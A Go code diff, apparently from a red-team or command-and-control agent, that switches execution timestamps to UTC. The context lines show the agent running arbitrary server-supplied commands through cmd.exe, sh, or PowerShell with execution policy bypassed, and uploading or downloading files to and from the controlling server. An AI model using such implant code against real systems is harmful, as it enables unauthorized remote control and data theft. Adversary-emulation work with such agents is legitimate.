@@ -24,11 +24,11 @@ func RunCommand(message string, httpServer string, profile map[string]interface{
     } else if (strings.HasPrefix(message, "download")) {
         pieces := strings.Split(message, "download")
         go download(httpServer, pieces[1])
-        return []byte("Download initiated\n"), 0, time.Now()
+        return []byte("Download initiated\n"), 0, getUTCTimeStamp()
     } else if (strings.HasPrefix(message, "upload")) {
         pieces := strings.Split(message, "upload")
         go upload(httpServer, pieces[1])
-        return []byte("Upload initiated\n"), 0, time.Now()
+        return []byte("Upload initiated\n"), 0, getUTCTimeStamp()
     } else {
         bites, status, executionTimestamp := execute(message, strings.Split(reflect.ValueOf(profile["executors"]).String(), ",")[0])
         return bites, status, executionTimestamp
@@ -42,18 +42,18 @@ func execute(command string, executor string) ([]byte, int, time.Time) {
     var executionTimestamp time.Time
     if runtime.GOOS == "windows" {
         if executor == "cmd" {
-            executionTimestamp = time.Now()
+            executionTimestamp = getUTCTimeStamp()
             bites, error = exec.Command("cmd.exe", "/c", command).Output()
         } else {
-            executionTimestamp = time.Now()
+            executionTimestamp = getUTCTimeStamp()
             bites, error = exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).Output()
         }
     } else {
-        executionTimestamp = time.Now()
+        executionTimestamp = getUTCTimeStamp()
         bites, error = exec.Command("sh", "-c", command).Output()
     }
     if error != nil {
-        executionTimestamp = time.Now()
+        executionTimestamp = getUTCTimeStamp()
         bites = []byte(string(error.Error()))
         status = 1
 	}
@@ -61,7 +61,7 @@ func execute(command string, executor string) ([]byte, int, time.Time) {
 }
 
 func changeDirectory(target string) ([]byte, time.Time) {
-    executionTimestamp := time.Now()
+    executionTimestamp := getUTCTimeStamp()
     os.Chdir(strings.TrimSpace(target))
     return []byte(" "), executionTimestamp
 }
@@ -119,4 +119,8 @@ func upload(server string, file string) []byte {
     }
     resp.Body.Close()
     return []byte(" ")
+}
+
+func getUTCTimeStamp() time.Time {
+	return time.Now().UTC()
 }
